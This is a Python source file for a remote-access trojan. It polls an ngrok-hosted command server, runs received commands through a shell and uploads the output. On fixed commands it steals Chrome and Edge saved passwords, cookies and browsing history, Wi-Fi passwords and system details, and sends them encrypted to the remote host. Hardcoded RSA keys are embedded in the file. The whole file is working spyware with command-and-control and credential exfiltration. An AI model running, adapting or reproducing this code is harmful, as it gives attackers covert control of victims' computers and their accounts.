from cryptography_ac import Crypt_ac
from Advanced_spyware import Multi_password_stealer,Web_information
from Advanced_spyware import Computer_inforamtion
from cryptography.fernet import Fernet
from ffd import Delet_files
import subprocess
import urllib.request
import requests
import hashlib
import os
import socket
import threading
import sys
import signal
import time
from urllib.request import urlopen
from bs4 import BeautifulSoup


ngrokurl = ''
    
private_key="""-----BEGIN RSA PRIVATE KEY-----
    MIICWwIBAAKBgQCVAL33yrxHbj2g/+c7qVHshnfXf1x/K0xIsh2pmA9AyySyxXKj
    FBVXRvol2UaD6yJoKOP7deJ4k6BzTYKFRt70Yc+tcOJzPUm309pJAvNSyFa4v5Qu
    YOXlXLl299UYXGVUG7KKM8K/59rVNPWLf7hRKVSfR4anfMZUhODTm3tkPwIDAQAB
    AoGAAxeQ2aOLZLAU91JYKhTJbm8b7YznDnyHiLqpgut05ZNRn6QZTOkNyFHgvwhT
    PkmS3TZ8BKvdl0L5AWuKWdmupruFuzTULhhN5hkZGTuHWmdooTbwm6e9cVtndaDL
    1mox3sbOTO5iykPzWuA84ciIqptNeprgFX7Gok/yuPLlCYECQQDCX7KM/ixv8jc0
    ZuiUHnUFq6oI3//dBtMZ4wvlq909NlPgmj+1bgfdJvvsxKLX84b9AlhUaCPWhjhN
    ki/i/mrNAkEAxD6GdJJol+JYJyGezxkFJXxB/qSiZw2MFABjfk8GyUtuCHHww6dr
    epXztiqBPGPSdhfxDDaJ4zbeveONlLnjOwJAQk4KxnXeCsIBeuqv4/cPzENm2Wgw
    C+HMGUSORmZ+LedebXuwx98k55fo0DezpR75qU0nfIOZ1hArHKsFktVe8QJAM0Oi
    HBGjAQo/vPkrYy5GCeTL2JlpU0JWtWLkmrpKK4to0wvwuSujCALkB1JTMFNjRzY5
    4dbdbl2HElO/SHrGwQJAc5PqdSdB6alQg+yoBRDR0xNATAOLomnRDil8zVRR4EJU
    rpv1e32DSJAgCJMDFLP/QiwdbxoSnlcQOIcU/5aZgw==
    -----END RSA PRIVATE KEY-----"""

public_key="""-----BEGIN PUBLIC KEY-----
    MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5Fu8lAzSZGCS6vko1ZjTXnHpv
    TfJJ44X/gAmNM5sBhFrfEs3d7CgAKAt5tjcYTgLGDUDzZC5uY2Qkn+lxBzYiIc+V
    Y5mCe+Kb10GSn0HbF27JoChSzQ9gR6OlBhIuglkicSxev2I4BrbM5gczLDKlX5kp
    qaVDjrWJ6K6tjtY4EQIDAQAB
    -----END PUBLIC KEY-----"""


class Revers_shell_server:

    def __init__(self,ngrok_url,red_list=[]):
        self.ngrok_url=ngrok_url
        self.cipher=Crypt_ac().Asymmetric_encryption()
        self.public_key=public_key.replace('  ','')
        self.private_key=private_key.replace('  ','')
        self.host=socket.gethostbyname(socket.gethostname())
        self.hash_host=hashlib.md5(self.host.encode()+os.getlogin().encode()).hexdigest()[8:]+'.txt'
        self.red_list=red_list
        
       
    def _exicute_command(self,command,cipher):
        print(command)
        exicute=True
        for i in self.red_list:
            if command in i:
                exicute=False
                break
        if exicute:
            p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            out=b''
            for i in p.stdout.readlines():
                out+=i
            return out
        self.__external__(command,cipher)
        return 'True'
        
    def read_command(self):
        command=urllib.request.urlopen(self.ngrok_url+'command.txt')
        #print(command.read())
        return command.read()
        
        
    def listen_and_send_symmetric_key(self):
        while True:
            try:
                reqs=requests.get(self.ngrok_url+'/conn')
                soup=BeautifulSoup(reqs.text, 'html.parser')
                up=False
                for i in soup.find_all('a'):
                    if self.hash_host in str(i):
                        up=True
                if not up:
                    enkey=self.cipher.rsa_encryt(self.public_key,self.host.encode())
                    self.upload_data(enkey,self.ngrok_url+'/conn',self.hash_host)
            except Exception as e:
                print(e)
                time.sleep(1)
            try:
                messages=self.cipher.rsa_decrypt(self.private_key,self.read_command()).decode()
                if 'connect '+self.host in messages:
                    key=Fernet.generate_key()
                    encrypkey=self.cipher.rsa_encryt(self.public_key,key)
                    self.upload_data(encrypkey,self.ngrok_url+'/out','out.txt')
                    break
            except Exception as e:
                pass
        time.sleep(1.5)
        cipher=Crypt_ac().Symmetric_encryption(key)
        return cipher
                     
    
    def upload_data(self,data,url,name):
        #print(self.ngrok_url+'/out/out.txt')
        return requests.post(url,files = {name: data})
    
    
    def _split_command_offset(self,message):
        offset=''
        for i in message:
            if i !=',':
                offset+=i.strip()
            else:
                #print(offset)
                return [offset,message[len(offset)+1:].strip()]
        return ['0','0']
    
    
    def _connect(self,cipher,red_list=[]):
        compar_offset=''  
        while True:
            try:
                c_off=cipher.fer_decrypt(self.read_command())
                c_off=self._split_command_offset(str(c_off.decode()))
                command,offset=c_off[1],c_off[0]
                if compar_offset!=offset:
                    compar_offset=offset
                    command=self._exicute_command(command,cipher)
                    command=cipher.fer_encrypt(command)
                    print(self.upload_data(command,self.ngrok_url+'/out','out.txt'))

            except Exception as e:
                #if len(str(e))>1:
                 #   print(e)
                pass
            time.sleep(0.5)
            c=1
                    
            
    def __stay__(self,ferkey):
        while True:
            reqs=requests.get(self.ngrok_url+'/conn')
            soup=BeautifulSoup(reqs.text, 'html.parser')
            up=False
            for i in soup.find_all('a'):
                if self.hash_host in str(i):
                    up=True
            if not up:
                encrypthost=self.cipher.rsa_encryt(self.public_key,self.host.encode())
                self.upload_data(encrypthost,self.ngrok_url+'/conn',self.hash_host)
            try:
                mes=self.cipher.rsa_decrypt(self.private_key,self.read_command()).decode()
                if mes=='kill connection':
                    os.startfile(sys.argv[0])
                    os.kill(os.getpid(), signal.SIGTERM)
                elif 'connect '+self.host in mes:
                    encrypkey=self.cipher.rsa_encryt(self.public_key,ferkey)
                    self.upload_data(encrypkey,self.ngrok_url+'/out','out.txt')
            except:
                pass
            time.sleep(2)
    
    
        
            
    def start(self):
        global ferkey
        print('{+}Server '+self.host+' Listening...')
        cipher=self.listen_and_send_symmetric_key()
        ferkey=cipher.key
        def __connect__(cipher):
            print('{+}New Connection')
            self._connect(cipher)
        def __stay_up__():
            self.__stay__(ferkey)
        Thread1 = threading.Thread(target=__connect__,args=(cipher,))
        Thread2 = threading.Thread(target=__stay_up__)
        Thread1.start()
        Thread2.start()
        Thread1.join()
        Thread2.join()

    def __external__(self,command,cipher):
        url=self.ngrok_url+'/external'
        password=Multi_password_stealer()
        web=Web_information()
        comp=Computer_inforamtion()
        fer=Fernet(cipher.key)
        if command == 'get chrome passwords':
            print('poplopo')
            pswd=password.Chrome().show()
            name=pswd[::2]
            pswd=pswd[1::2]
            for i in range(len(name)):
                print(self.upload_data(fer.encrypt(pswd[i].encode()),url,name[i]+', '+self.hash_host))

        elif command == 'get edge passwords':
            pswd=password.Edge().show()
            name=pswd[::2]
            pswd=pswd[1::2]
            for i in range(len(name)):
                self.upload_data(fer.encrypt(pswd[i].encode()),url,name[i]+', '+self.hash_host)

        elif command == 'get wifi passwords':
            self.upload_data(fer.encrypt(password.Wifi().show().encode()),url,'wifi'+', '+self.hash_host)

        elif command == 'get chrome cookies':
            cookies=web.Chrome_cookies().show()
            name=cookies[::2]
            cookies=cookies[1::2]
            for i in range(len(name)):
                self.upload_data(fer.encrypt(cookies[i].encode()),url,name[i]+', '+self.hash_host)

        elif command == 'get edge cookies':
            cookies=web.Edge_cookies().show()
            name=cookies[::2]
            cookies=cookies[1::2]
            for i in range(len(name)):
                self.upload_data(fer.encrypt(cookies[i].encode()),url,name[i]+', '+self.hash_host)

        elif command == 'get chrome history':
            history=web.Chrome_history().show()
            name=history[::2]
            history=history[1::2]
            for i in range(len(name)):
                self.upload_data(fer.encrypt(history[i].encode()),url,name[i]+', '+self.hash_host)

        elif command == 'get edge history':
            history=web.Edge_history().show()
            name=history[::2]
            history=history[1::2]
            for i in range(len(name)):
                self.upload_data(fer.encrypt(history[i].encode()),url,name[i]+', '+self.hash_host)

        elif command == 'get computer info':
            self.upload_data(fer.encrypt(comp.show().encode()),url,'system info'+', '+self.hash_host)

    
if __name__=='__main__':
    in_commend= [
     'get chrome passwords','get edge passwords',
     'get wifi passwords','get chrome cookies','get edge cookies'
     ,'get chrome history','get edge history','get computer info'
    ]
    
    Revers_shell_server(ngrokurl,red_list=in_commend).start()
    
    
    
